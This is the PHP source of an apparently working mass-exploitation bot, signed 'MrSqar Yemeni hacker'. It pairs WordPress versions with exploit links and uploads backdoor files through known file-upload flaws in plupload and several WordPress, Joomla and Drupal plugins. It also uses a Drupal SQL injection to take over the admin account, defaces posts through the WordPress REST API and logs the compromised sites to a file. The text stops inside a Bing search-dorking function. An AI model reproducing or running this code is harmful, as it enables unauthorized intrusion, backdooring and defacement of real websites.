<?php
/*
#*##*##*##*##*##*##*##*##*##*##*##*##*# 
#*#                  			    #*#               
#*#  Coded by MrSqar Yemeni hacker  #*#
#*#      							#*#
#*#     mail : mrsqar@gmail.com		#*#
#*#  								#*#
#*#      	MaDe In YeMeN			#*#
#*#									#*#
#*# Note: Don't change my copyright #*#
#*#  		 please , ok ? 			#*#
#*# 								#*#
#*# 								#*#
#*##*##*##*##*##*##*##*##*##*##*##*##*#
*/

########################################
#//||||||||||| check root |||||||||||\\#
########################################
$root = shell_exec("id");
if (!preg_match("/root/",$root)){
		system("clear");
		$red    = "\e[91m";
		echo $red."\n[~] please run script as root "."\n\n";
		exit;
	}
##########################################
#//|||||||||||~ check curl ~|||||||||||\\#
##########################################
if(!extension_loaded('curl')) {
		system("clear");
		$red    = "\e[91m";
		echo $red."\n[~]  curl is not installed pls install it by this command "."\n";
		echo "    install it for you ? (y/n) : ";
		$install = trim(fgets(STDIN,1024));
		if ($install == "y"){
		$install = "sudo apt-get install php-curl -y";
		system("$install");
		exit();
			} else {
#########################################
#//||||||||||| exit script |||||||||||\\#
#########################################		
				exit();
				
				}
		} 
######################################################
#//|//|//|//|//|//|//|//|//|//|//|//|//|///|//|//|//|#
######################################################

#####################
## script go go :V ##
#####################

require("Header.php");
###############################################
#//|||||||||||||  array  start |||||||||||||\\#
###############################################
$wordpress = array(
'4.7.1' => "
4.7.1 vulns [
\n
https://www.exploit-db.com/exploits/41497/
https://www.exploit-db.com/exploits/41224/
http://0day.today/exploit/description/27720
http://0day.today/exploit/description/26956
http://0day.today/exploit/description/26885
http://0day.today/exploit/description/26884
http://0day.today/exploit/description/26876
\n
]
\n
",
'4.7' => "
4.7.1 vulns [
https://www.exploit-db.com/exploits/41497/
https://www.exploit-db.com/exploits/41224/
http://0day.today/exploit/description/27720
http://0day.today/exploit/description/26956
http://0day.today/exploit/description/26885
http://0day.today/exploit/description/26884
http://0day.today/exploit/description/26876
\n
]
\n
",
'4.6' => "
4.6 vulns [\n
https://www.exploit-db.com/exploits/41962/
http://0day.today/exploit/description/25575
\n
]
\n
",


'4.5.3' => "
4.5.3 vulns [\n
https://www.exploit-db.com/exploits/40288/
http://0day.today/exploit/description/27237
http://0day.today/exploit/description/27236
\n
]
\n
",

'4.0' => "
4.0 vulns [\n
https://www.exploit-db.com/exploits/35413/
http://0day.today/exploit/description/27177
\n
]
\n
",

'4.2' => "
4.2 vulns [\n
https://www.exploit-db.com/exploits/36844/
http://0day.today/exploit/description/23993
\n
]
\n
",

'3.6' => "
3.6 vulns [\n
https://www.exploit-db.com/docs/28958.pdf
\n
]
\n
",

'3.4.2' => "
3.4.2 vulns [\n
http://0day.today/exploit/description/19896
http://0day.today/exploit/description/19876
http://0day.today/exploit/description/19447
https://www.exploit-db.com/exploits/37826/
\n
]
\n
",

'3.3.1' => "
3.3.1 vulns [\n
http://0day.today/exploit/description/19711
http://0day.today/exploit/description/18138
http://0day.today/exploit/description/17434
\n
]
\n
",

'3.1.3' => "
3.1.3 vulns [\n
https://www.exploit-db.com/exploits/17465/
\n
]
\n
",

'3.0.3' => "
3.0.3 vulns [\n
http://0day.today/exploit/description/25032
http://0day.today/exploit/description/20175
http://0day.today/exploit/description/15259
\n
]
\n
",

'3.0.1' => "
3.0.1 vulns [\n
http://0day.today/exploit/description/27164
http://0day.today/exploit/description/21153
http://0day.today/exploit/description/14864
http://0day.today/exploit/description/13702
\n
]
\n
",
);
$joomla = array(
'' => "

"
);
###############################################
#//||||||||||||||  array  end ||||||||||||||\\#
###############################################

###############################################
#//|||||||||||| Functions start ||||||||||||\\#
###############################################
function plupload($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/plupload/examples/upload.php";
$h = @file_get_contents("$target1");
if(preg_match("/jsonrpc/",$h)){
$uploadfile="BackDoor/BadMod.jpg";
$uploadfile2="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
$uploadfile2=realpath($uploadfile2) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
  $cFile2 = curl_file_create($uploadfile2);
} else { // 
  $cFile = '@' . realpath($uploadfile);
  $cFile2 = '@' . realpath($uploadfile2);
}
$post = array('file'=> $cFile,'name' => $cFile2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result = $target."/plupload/examples/uploads/BadMod.php";
$result = @file_get_contents("$result");
if(preg_match("/Hacked/",$result)){
echo $red."  [plupload] -============- ".$green." Done";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."plupload/examples/uploads/BadMod.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
echo $red."  [plupload] -============- ".$orange." Failed ";
}else{
$target1 = $target."/plupload/examples/upload.php";
$h = @file_get_contents("$target1");
if(preg_match("/jsonrpc/",$h)){
$uploadfile="BackDoor/BadMod.jpg";
$uploadfile2="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
$uploadfile2=realpath($uploadfile2) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
  $cFile2 = curl_file_create($uploadfile2);
} else { // 
  $cFile = '@' . realpath($uploadfile);
  $cFile2 = '@' . realpath($uploadfile2);
}
$post = array('file'=> $cFile,'name' => $cFile2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result = $target."/js/plupload/examples/uploads/BadMod.php";
$result = @file_get_contents("$result");
if(preg_match("/Hacked/",$result)){
echo $red."  [plupload] -============- ".$green." Done";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/js/plupload/examples/uploads/BadMod.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
echo $red."  [plupload] -============- ".$orange." Failed ";
}
}
}

function wp_qual($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result = trim($result);
if($result == 1){
echo $red."  [wp_qual] -=============- ".$green." Done !";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."BadMod.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
echo $red."  [wp_qual] -=============- ".$orange." Failed ";
}
}
function GetWpVer($target){
$r = file_get_contents("$target");
preg_match_all('<meta name="generator" content="(.*)" />',$r,$re);
foreach($re[1] AS $version){
if(!preg_match("/WordPress/",$version)){
$version = " UNKNOWN";	
}else{
$arr = "WordPress";
$version = str_replace($arr,"",$version);
$version = trim($version);
}
echo " ".$version;	
}
}
function wp_bsn($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/wp-admin/admin-ajax.php?action=wpbdp-file-field-upload";
$uploadfile="BackDoor/BadMod.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.gif";
$src = @file_get_contents("$result2");
if(preg_match("/Hacked/",$src)){
echo $red."  [wp_bsn] -==============- ".$green." Done !";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
echo $result;
echo $result2;
}else{
echo $red. "  [wp_bsn] -==============- ".$orange."Failed"." \n";
}
}

function wp_jbm($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/jm-ajax/upload_file";
$src = @file_get_contents("$target1");
if(preg_match("/files/",$src)){
$uploadfile="BackDoor/BadMod.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.gif";
echo $red."  [wp_jbm] -==============- ".$green." Done !";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
}else{
echo $red. "  [wp_jbm] -==============- ".$orange."Failed"." \n";

}
}

function joom_ver($url){
	$green  = "\e[92m";
    $red    = "\e[91m";
$url = $url."/language/en-GB/en-GB.xml";
$source = file_get_contents("$url");
if(preg_match("/xml/",$source)){
$source = file_get_contents("$url");
$exp = explode("\n",$source);
if(preg_match("/xml/",$exp[0])){
unset($exp[0]);
}
if(preg_match("/metafile/",$exp[1])){
$arr = array(
'<' => "",
'metafile' => "",
'version' => "",
'=' => "",
'"' => "",
'client' => "",
'site' => "",
'>' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp[1]);
$version =  $red. "  [Version] -====- ".$green.trim($rb)."\n";
echo $version;
}elseif(preg_match("/metafile/",$exp[2])){
$arr = array(
'<' => "",
'metafile' => "",
'version' => "",
'=' => "",
'"' => "",
'client' => "",
'site' => "",
'>' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp[2]);
$version =  $red. "  [Version] -====- ".$green.trim($rb)."\n";
echo $version;
}
else{
$version =  $red. "  [Version] -====- ".$green." UNKNOWN"."\n";
echo $version;
}
}

}
function wp_upload2($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.txt";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.txt";
$h2 = @file_get_contents("$result2");
if(@preg_match("/MrSqar/",$h2)){
echo $red."  [upload] -==============- ".$green." Done !";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [wp_upload2] -==========- ".$orange."Failed"." \n";

}
}else{
echo $red. "  [wp_upload2] -==========- ".$orange."Failed"." \n";

}
}
function wp_blazeS($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.php.gif";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-content/plugins/blaze-slide-show-for-wordpress/js/swfupload/js/upload.php";
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/blaze-slide-show-for-wordpress/js/swfupload/js/BadMod.php.gif";
$source = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source)){
$hacked = fopen("result/Hacked.txt","a+");
echo $red."  [wp_blazeS] -===========- ".$green." Done ! \n";
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_blazeS] -===========- ".$orange."Failed"." \n";	
}
}
function wp_blocker($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
$post = array('popimg'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$hack = $target."/wp-content/uploads/20$y/$m/BadMod.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_blocker] -==========- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_blocker] -==========- ".$orange."Failed"." \n";
}
}
function wp_formcraft($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/mrsqar.png";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('files[]'=> $cFile);
$target1 = $target."/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
$source = @file_get_contents("$target1");
if(preg_match("/failed/",$source)){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$exp = explode("files",$result);
$arr = array(
"\/" => "",
'"' => "",
"}" => "",
"{" => "",

);
$rb = str_replace(array_keys($arr),$arr,$exp[4]);
$hack = $target."/wp-content/plugins/formcraft/file-upload/server/content/files/$rb";
echo $red."  [wp_formcraft] -========- ".$green." Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_formcraft] -========- ".$orange."Failed"." \n";
}
}
#
function wp_ads($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
$target2 = $target."/wp-content/plugins/simple-ads-manager/readme.txt";
$source = @file_get_contents("$target2");
if(preg_match("/Simple/",$source)){
$post = array('path' => './','uplaodfile'=> $cFile,'action' => "upload_ad_image");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/simple-ads-manager/BadMod.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_ads] -==============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_ads] -==============- ".$orange."Failed"." \n";
}
}
else{
echo $red. "  [wp_ads] -==============- ".$orange."Failed"." \n";
}
}

function com_fabrik($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.txt";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0&Itemid=0";
$source = @file_get_contents("$target1");
if(preg_match("/CSV/",$source)){
$post = array('userfile'=> $cFile,'drop_data' => "1",'overwrite' => "1",'field_delimiter' => "," , 'text_delimiter' => '"','option' => "com_fabrik",'controller' => "import",'view' => "import",'task' => "doimport",'tableid' => "0");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/media/BadMod.txt";
$source2 = @file_get_contents("$hack");
if(preg_match("/Yemeni/",$source2)){
echo $red."  [com_fabrik] ====> ".$green." Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [com_fabrik] ====> ".$orange."Failed"." \n";
}
}else{
echo $red. "  [com_fabrik] ====> ".$orange."Failed"." \n";	
}
}
function wp_jquery($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('files'=> $cFile);
$target1 = $target."/assets/global/plugins/jquery-file-upload/server/php/";
$source1 = @file_get_contents("$target1");
if(preg_match("/files/",$source1)){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target1."/BadMod.php";
$source = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source)){	
echo $red."  [wp_jquery] -===========- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_jquery] -===========- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [wp_jquery] -===========- ".$orange."Failed"." \n";

	}
}
function wp_dreamwork($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.html";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('task' => "drm_add_new_album",'album_name' => "Arbitrary File Upload",'album_desc' => "Arbitrary File Upload",'album_img'=> $cFile);
$ch = curl_init();
$target1 = $target."/wp-admin/admin.php?page=dreamwork_manage";
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec($ch);
curl_close ($ch);
if(preg_match("/wp-content/",$result)){
$exp = explode("wp-content",$result);
$arr = array(
'(' => "",
')' => "",
'Error' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp);
$hack = $target.$rb[1];
if(preg_match("/wp-content/",$hack)){
$hack = $target.$rb[1];
	}else{
$hack = $target."/wp-content/".$rb[1];
$hack = trim($hack);
	}
$src = @file_get_contents("$hack");
if(preg_match("/Hacked/",$src)){
echo $red."  [dreamwork_manage] -====- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}
}else{
echo $red. "  [dreamwork_manage] -====- ".$orange."Failed"." \n";

}
}

function wp_rightnow($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "BackDoor/BadMod.html";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('Filedata'=> $cFile);
$target1 = $target."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result= curl_exec ($ch);
curl_close ($ch);
$source = "$target/wp-content/uploads/settingsimages/badmod.html";
$source2 = @file_get_contents("$source");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_rightnow] -=========- ".$green."Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$source);
fwrite($hacked,"\n");	
fclose($hacked);
}else
	{
echo $red. "  [wp_rightnow] -=========- ".$orange."Failed"." \n";
		}
}

function wp_upload($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$target1 = $target."/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
$h = get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/wp-content/plugins/cherry-plugin/admin/import-export/BadMod.php";
$h2 = @file_get_contents("$result2");
if(preg_match("/BadMod/",$h2)){
echo $red."  [upload] -==============- ".$green." Done";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."badmod.html";
fwrite($hacked,$def);
fwrite($hacked,"\n");
echo $result2;
	}else{
echo $red. "  [wp_upload] -===========- ".$orange."Failed"." \n";

}
}else{
echo $red. "  [wp_upload] -===========- ".$orange."Failed"." \n";

}
}

function add_user($target){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
    $log = "/user/login";
    $url2 = $target.$log;
    $holako = "/?q=user";
    $post_data = "name[0;update users set name %3D 'badmod' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
    )
    );
    $ctx = @stream_context_create($params);
    $data = @file_get_contents("$url2", null, $ctx);
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
$result = fopen("result/Hacked.txt","a+");	
echo $red."  [add_user] ====> ".$green." Done !\n";
fwrite($result,$url2." => username : badmod  => password : admin");
fwrite($result,"\n");
fclose($result);
    } else {
echo $red. "  [add_user] ====> ".$orange."Failed"." \n";
}
	}

function joom_down($url){
     $file1='BackDoor/BadMod.zip';
     $file2='BackDoor/BadMod.gif';
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile1 = curl_file_create($file1);
} else { // 
  $cFile1 = '@' . realpath($file1);
}
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile2 = curl_file_create($file2);
} else { // 
  $cFile2 = '@' . realpath($file2);
}
     $bbb='/index.php?option=com_jdownloads&Itemid=0&view=upload';
     $sco=($url).($bbb); 
        $post=array(
    'name'=>'BadMod_MrSqar','mail'=>'mrsqar@gmail.com','catlist'=>'1','file_upload'=> $cFile1 ,'filetitle' =>"Hacked by MrSqar",
    'description'=>"<p>Hacked</p>" ,'2d1a8f3bd0b5cf542e9312d74fc9766f'=>1,
    'send'=>1,'senden'=>"Send file", 'description'=>"<p>Owned</p>",
    'option'=>"com_jdownloads",'view'=>"upload",'pic_upload'=> $cFile2
    );
        $ch = curl_init ($sco);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT,3 );
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.36");
        curl_setopt ($ch, CURLOPT_POST, TRUE);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
        $data = curl_exec ($ch);
        curl_close ($ch);
    $path='/images/jdownloads/screenshots/';
    $TheEnd=($url).($path).($file2);
$red    = "\e[91m";
$green  = "\e[92m";
$orange = "\e[38;5;208m";
    if(preg_match("/color=\"green\">/",$data)){
echo $red. "  [com_j-d] ====> ".$green."Done"." \n";
$result = fopen("result/Hacked.txt","a+");	
fwrite($result,$TheEnd);
fwrite($result,"\n");
    }else{
echo $red. "  [com_j-d] ====> ".$orange."Failed"." \n";	
	}
} 

function drupal_upload($target){
$green  = "\e[92m";
$red    = "\e[91m";
$orange = "\e[38;5;208m";
$uploadfile="mrsqar.gif";
$uploadfile2="mrsqar.jpg";
$ch = curl_init("$target/sites/all/modules/dragdrop_gallery/upload.php?nid=1&filedir=/drupal/sites/all/modules/dragdrop_gallery/");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('user_file[0]'=>"@$uploadfile",
                                            'user_file[1]'=>"@$uploadfile2"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
$ok = get_headers("$target/sites/all/modules/dragdrop_gallery/$uploadfile");
if(preg_match("/404/",$ok[0])){
echo $red. "  [upload] ====> ".$orange."Failed"." \n";
}else{
$result = fopen("result/Hacked.txt","a+");	
$ok = "$target/sites/all/modules/dragdrop_gallery/$uploadfile";
echo $red."  [upload] ====> ".$green." Done !\n";
fwrite($result,$ok);
fwrite($result,"\n");
fclose($result);
}
}
function contents($target){
$source = @file_get_contents("$target"."/wp-json/wp/v2/posts/");
$exp = explode(",",$source);
$black = array(
        '{'  => '', 
        '"'  => '', 
        'id'  => '', 
        ':'  => '', 
        '['  => '', 
        ']'  => '', 
);
$rb = @str_replace( array_keys( $black ), $black, $exp[0] );
$content = "
      HaCkEd bY MrSqAr HaCkEr 
	  BadMod Yemeni bot v1.0       
";
$file = "badmod.html";
$id = $rb."justracccwdata";
$target2 = $target."/wp-json/wp/v2/posts/1";
$data = array("id" => $id,"title" => "Hacked by MrSqar !","slug" => $file , "content" => $content);                                                                    
$data_string = json_encode($data);                                                                                   
$ch = curl_init("$target2");                                                                      
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);                                                                  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
curl_setopt($ch, CURLOPT_HTTPHEADER, array(                                                                          
    'Content-Type: application/json',                                                                                
    'Content-Length: ' . strlen($data_string))                                                                       
);                                                                                                                   
$result = curl_exec($ch);
//echo $result;
$red    = "\e[91m";
$green  = "\e[92m";
$orange = "\e[38;5;208m";
if(preg_match("/$file/",$result)){
echo $red. "  [inject] -==============- ".$green."Done"." \n";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."badmod.html";
fwrite($hacked,$def);
fwrite($hacked,"\n");
	} else {		
$red    = "\e[91m";
$green  = "\e[92m";
$orange = "\e[38;5;208m";
echo $red. "  [inject] -==============- ".$orange."Failed"." \n";
}
}
function bing($what) {
    for ($i = 1;$i <= 300000;$i+= 10) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.bing.com/search?q=" . urlencode($what) . "&&first=" . $i . "&FORM=PERE");
        curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/log.txt');
